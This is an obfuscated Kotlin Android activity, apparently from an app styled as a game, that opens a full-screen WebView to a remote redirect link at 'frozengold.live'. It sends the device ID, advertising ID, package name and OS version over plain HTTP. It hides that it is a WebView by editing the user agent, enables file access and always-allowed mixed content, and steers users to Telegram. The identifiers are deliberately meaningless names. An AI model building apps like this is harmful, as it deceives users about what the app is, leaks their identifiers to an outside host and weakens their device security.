package com.ngelgames.heroc.koroutims

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.provider.MediaStore
import android.util.Log
import android.webkit.*
import android.widget.Toast
import com.google.android.material.snackbar.Snackbar
import com.ngelgames.heroc.BiggestClassser
import com.ngelgames.heroc.R
import com.ngelgames.heroc.databinding.ActivitySiteraBezTebyaBinding
import com.onesignal.OneSignal
import com.orhanobut.hawk.Hawk
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class SiteraBezTebya : AppCompatActivity() {


    private val OpasItsKrash = 1


    var UriOrNotWhat: ValueCallback<Array<Uri>>? = null


    var kranTechetSilno: String? = null


    lateinit var neLubovNeChsatse: WebView


    lateinit var gEEEEEEEEEeesfmmmxmxmx: ActivitySiteraBezTebyaBinding


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        gEEEEEEEEEeesfmmmxmxmx = ActivitySiteraBezTebyaBinding.inflate(layoutInflater)
        setContentView(gEEEEEEEEEeesfmmmxmxmx.root)

        neLubovNeChsatse = gEEEEEEEEEeesfmmmxmxmx.weberast
        Snackbar.make(
            gEEEEEEEEEeesfmmmxmxmx.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()


        val cokkkkkerMajans = CookieManager.getInstance()
        cokkkkkerMajans.setAcceptCookie(true)
        cokkkkkerMajans.setAcceptThirdPartyCookies(neLubovNeChsatse, true)
        UlitkaNeGrusti()
        val opeeeeeeeeeeranTransKrnas: Activity = this


        neLubovNeChsatse.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(kilosTash: WebView, urlikitriLkirk: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(urlikitriLkirk)) {
                        return false
                    }
                    if (askkkkkkkkkkkkeLAelsllx(urlikitriLkirk)) {

                        val inTTTTTTTTtsafsfgsg = Intent(Intent.ACTION_VIEW)
                        inTTTTTTTTtsafsfgsg.data = Uri.parse(urlikitriLkirk)
                        startActivity(inTTTTTTTTtsafsfgsg)
                    } else {
                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                kilosTash.loadUrl(urlikitriLkirk)
            }
            override fun onPageFinished(teloStarie: WebView, UlitkaZahoditvBar: String) {
                super.onPageFinished(teloStarie, UlitkaZahoditvBar)
                //Save the last visited URL
                QsjjjsAIIIIIIIIIIIiisakska(UlitkaZahoditvBar)
            }
            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(opeeeeeeeeeeranTransKrnas, description, Toast.LENGTH_SHORT).show()
            }
        }


        neLubovNeChsatse.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                UriOrNotWhat?.onReceiveValue(null)
                UriOrNotWhat = filePathCallback
                var BarmenGovorit: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (BarmenGovorit!!.resolveActivity(packageManager) != null) {
                    // create the file where the photo should go
                    var MineObsluzhivaemUlitok: File? = null
                    try {
                        MineObsluzhivaemUlitok = EtoNeLubows()
                        BarmenGovorit.putExtra("PhotoPath", kranTechetSilno)
                    } catch (ex: IOException) {
                        // Error occurred while creating the File
                    }
                    // continue only if the file was successfully created
                    if (MineObsluzhivaemUlitok != null) {
                        kranTechetSilno = "file:" + MineObsluzhivaemUlitok.absolutePath
                        BarmenGovorit.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(MineObsluzhivaemUlitok)
                        )
                    } else {
                        BarmenGovorit = null
                    }
                }


                val UlitkeGrustno = Intent(Intent.ACTION_GET_CONTENT)
                UlitkeGrustno.addCategory(Intent.CATEGORY_OPENABLE)
                UlitkeGrustno.type = "image/*"
                val jullllllIaReplic: Array<Intent?> =
                    BarmenGovorit?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val SprosiUlitkuKakDela = Intent(Intent.ACTION_CHOOSER)
                SprosiUlitkuKakDela.putExtra(Intent.EXTRA_INTENT, UlitkeGrustno)
                SprosiUlitkuKakDela.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser))
                SprosiUlitkuKakDela.putExtra(Intent.EXTRA_INITIAL_INTENTS, jullllllIaReplic)
                startActivityForResult(
                    SprosiUlitkuKakDela, OpasItsKrash
                )
                return true
            }
            // creating image files (Lollipop only)
            @Throws(IOException::class)
            private fun EtoNeLubows(): File {
                var FraraaaaUtrrransneeeeeeeeeesk = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!FraraaaaUtrrransneeeeeeeeeesk.exists()) {
                    FraraaaaUtrrransneeeeeeeeeesk.mkdirs()
                }
                // create an image file name
                FraraaaaUtrrransneeeeeeeeeesk =
                    File(FraraaaaUtrrransneeeeeeeeeesk.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return FraraaaaUtrrransneeeeeeeeeesk
            }
        }
        neLubovNeChsatse.loadUrl(UlitkinDomikNaVetru())
    }



    private fun UlitkaNeGrusti() {
        val UlitkaVeseliNas = neLubovNeChsatse.settings
        UlitkaVeseliNas.javaScriptEnabled = true
        UlitkaVeseliNas.useWideViewPort = true
        UlitkaVeseliNas.loadWithOverviewMode = true
        UlitkaVeseliNas.allowFileAccess = true
        UlitkaVeseliNas.domStorageEnabled = true
        UlitkaVeseliNas.userAgentString = UlitkaVeseliNas.userAgentString.replace("; wv", "")
        UlitkaVeseliNas.javaScriptCanOpenWindowsAutomatically = true
        UlitkaVeseliNas.setSupportMultipleWindows(false)
        UlitkaVeseliNas.displayZoomControls = false
        UlitkaVeseliNas.builtInZoomControls = true
        UlitkaVeseliNas.setSupportZoom(true)
        UlitkaVeseliNas.pluginState = WebSettings.PluginState.ON
        UlitkaVeseliNas.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        UlitkaVeseliNas.setAppCacheEnabled(true)
        UlitkaVeseliNas.allowContentAccess = true
    }
    private fun UlitkinDomikNaVetru(): String {
        val UliRtRlslalsla = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
        val fararShamarahara = "com.ngelgames.heroc"
        val PelllllllllllesTrans: String? = Hawk.get(BiggestClassser.kriAwrrrrraswaKKasss, "null")
        val Olelelelellaspppppas: String? = Hawk.get(BiggestClassser.poEassssJoiakkkkkkkkkas, "null")
        val tTrsaetrGFFFFFFFFFFFFFfas = "deviceID="
        val aslllllllllllEgannnsa = "ad_id="
        val Trekkkkkkkkkkkaslalells = "sub_id_4="
        val ReskiiiiiiiiiiinsaS = "sub_id_5="
        val aQwrrrrrrrrrreiaskkFF = "sub_id_6="
        val ainnnnEasdsfa = "http://"
        val PolllllllllliSAsa = "frozengold.live/go.php?to=2&"
        val mKlsallllllllllllllllleATsa = "naming"
        val ViseeeeeeeeeKasklsa = Build.VERSION.RELEASE
        val askeEeeeeeeeeeeeeeRassa = ainnnnEasdsfa + PolllllllllliSAsa
        val askEEEEEEEEEEElaslslx = "$askeEeeeeeeeeeeeeeRassa$tTrsaetrGFFFFFFFFFFFFFfas$PelllllllllllesTrans&$aslllllllllllEgannnsa$Olelelelellaspppppas&$Trekkkkkkkkkkkaslalells$fararShamarahara&$ReskiiiiiiiiiiinsaS$ViseeeeeeeeeKasklsa&$aQwrrrrrrrrrreiaskkFF$mKlsallllllllllllllllleATsa"
        Log.d("TESTAG", "Test Result $askEEEEEEEEEEElaslslx")
        OeeeeeeeeeeParassssssssssskae(PelllllllllllesTrans.toString())
        return UliRtRlslalsla.getString("SAVED_URL", askEEEEEEEEEEElaslslx).toString()
    }




    private fun OeeeeeeeeeeParassssssssssskae(traeeeeeeeeeeLosktas: String) {
// Setting External User Id with Callback Available in SDK Version 4.0.0+
        OneSignal.setExternalUserId(
            traeeeeeeeeeeLosktas,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val sakssSSSSSSSsssssa = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $sakssSSSSSSSsssssa"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val EmskkkkkkkkkkkARsasa =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $EmskkkkkkkkkkkARsasa"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val trrrrrrrrrrreIAIsiisiisa = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $trrrrrrrrrrreIAIsiisiisa"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }
                override fun onFailure(error: OneSignal.ExternalIdError) {
                    // The results will contain channel failure statuses
                    // Use this to detect if external_user_id was not set and retry when a better network connection is made
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }





    private var NoPochemuKolorads = false
    override fun onBackPressed() {
        if (neLubovNeChsatse.canGoBack()) {
            if (NoPochemuKolorads) {
                neLubovNeChsatse.stopLoading()
                neLubovNeChsatse.loadUrl(Parrallllllllleskkkas)
            }
            this.NoPochemuKolorads = true
            neLubovNeChsatse.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                NoPochemuKolorads = false
            }, 2000)
        } else {
            super.onBackPressed()
        }
    }
    var Parrallllllllleskkkas = ""
    fun QsjjjsAIIIIIIIIIIIiisakska(asklWWWWWWWWWWWWWWWWEsa: String?) {
        if (!asklWWWWWWWWWWWWWWWWEsa!!.contains("t.me")) {
            if (Parrallllllllleskkkas == "") {
                Parrallllllllleskkkas = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    asklWWWWWWWWWWWWWWWWEsa
                ).toString()
                val krrrrrrrrrrosoaEEEEEEEEEEEeasfs = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val tReeeeeeeeeeeeeeeeeMasgtgggggggggggg = krrrrrrrrrrosoaEEEEEEEEEEEeasfs.edit()
                tReeeeeeeeeeeeeeeeeMasgtgggggggggggg.putString("SAVED_URL", asklWWWWWWWWWWWWWWWWEsa)
                tReeeeeeeeeeeeeeeeeMasgtgggggggggggg.apply()
            }
        }
    }



    private fun askkkkkkkkkkkkeLAelsllx(askkkkkkkkkkkkeLALssllsa: String): Boolean {
        val aslllllllllEKakskxxa = packageManager
        try {
            aslllllllllEKakskxxa.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)
            return true
        } catch (e: PackageManager.NameNotFoundException) {
        }
        return false
    }
    override fun onActivityResult(rssssssssKoollsa: Int, resioooooooooooooELalsla: Int, dooooooooooorsallsa: Intent?) {
        if (rssssssssKoollsa != OpasItsKrash || UriOrNotWhat == null) {
            super.onActivityResult(rssssssssKoollsa, resioooooooooooooELalsla, dooooooooooorsallsa)
            return
        }
        var askEEEEEEEEEEEEKslxlxla: Array<Uri>? = null
        // check that the response is a good one
        if (resioooooooooooooELalsla == AppCompatActivity.RESULT_OK) {
            if (dooooooooooorsallsa == null || dooooooooooorsallsa.data == null) {
                // if there is not data, then we may have taken a photo
                askEEEEEEEEEEEEKslxlxla = arrayOf(Uri.parse(kranTechetSilno))
            } else {
                val gooooooooooooRasnnsnnesaaaaaaaaaaaaa = dooooooooooorsallsa.dataString
                if (gooooooooooooRasnnsnnesaaaaaaaaaaaaa != null) {
                    askEEEEEEEEEEEEKslxlxla = arrayOf(Uri.parse(gooooooooooooRasnnsnnesaaaaaaaaaaaaa))
                }
            }
        }
        UriOrNotWhat?.onReceiveValue(askEEEEEEEEEEEEKslxlxla)
        UriOrNotWhat = null
    }
}